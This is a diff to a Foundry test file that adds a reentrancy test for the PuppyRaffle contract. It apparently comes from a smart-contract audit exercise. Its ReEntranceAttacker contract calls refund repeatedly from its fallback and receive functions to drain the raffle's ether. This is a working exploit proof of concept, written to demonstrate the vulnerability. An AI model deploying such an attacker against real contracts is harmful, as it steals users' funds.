@@ -243,4 +243,64 @@ assert(gasUsedSecond>gasUsedFirst) ;
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
+
+    function test_reentrancy_refund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerFour;
+        players[1] = playerOne;
+        players[2] = playerTwo;
+        players[3] = playerThree;
+        
+        puppyRaffle.enterRaffle{value:entranceFee*4}(players);
+
+        ReEntranceAttacker attackerContract = new ReEntranceAttacker(puppyRaffle) ;
+        address attackUser = makeAddr("AtackUser");
+        vm.deal(attackUser , 1 ether);
+
+        console.log("Attacker Contract Balance Before attacking ", address(attackerContract).balance);
+        console.log("Victim contract Balance before attacking ", address(puppyRaffle).balance);
+
+        vm.prank(attackUser);
+        attackerContract.attack{value:entranceFee}();
+
+        console.log("Attacker Contract Balance after attacking ", address(attackerContract).balance);
+        console.log("Victim contract Balance after attacking ", address(puppyRaffle).balance);
+
+    }
+}
+
+contract ReEntranceAttacker {
+
+    PuppyRaffle puppyRaffle ;
+
+    uint256 entranceFee ;
+    uint256 attackerIndex ;
+
+    constructor(PuppyRaffle _puppyRaffle){
+        puppyRaffle = _puppyRaffle ;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory player = new address[](1);
+        player[0] = address(this);
+
+        puppyRaffle.enterRaffle{value:entranceFee*player.length}(player);
+
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+function _stealMoney() internal {
+      if(address(puppyRaffle).balance >= entranceFee){
+            puppyRaffle.refund(attackerIndex);
+        }
+}
+    fallback() external payable{
+      _stealMoney() ;
+    }
+
+    receive() external payable{
+_stealMoney();
+    }
 }
